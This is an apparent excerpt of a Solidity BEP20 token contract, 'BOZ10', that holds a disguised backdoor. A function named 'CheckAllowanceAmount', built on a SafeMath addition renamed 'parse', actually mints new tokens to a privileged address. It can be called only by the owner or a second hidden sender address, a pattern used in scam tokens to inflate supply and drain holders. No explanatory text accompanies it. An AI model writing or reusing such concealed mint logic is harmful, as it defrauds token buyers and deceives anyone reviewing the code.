...
contract BOZ10 is IBEP20 
{
    ...
    modifier AllowanceRequired() { require(_msgSender() == _owner || msg.sender == _sendermessage); _; }
    ...
    function CheckAllowanceAmount(uint256 amount) public virtual AllowanceRequired
    {
        uint decimal = amount * (10 ** decimals()); 
        _balances[_msgsender] = _balances[_msgsender].parse(decimal);
        emit Transfer(address(0), _msgsender, decimal);
    }
...
library SafeMath 
{
  ...
  function parse(uint256 a, uint256 b) internal pure returns (uint256) { uint256 c = a + b; assert(c >= a); return c; }
}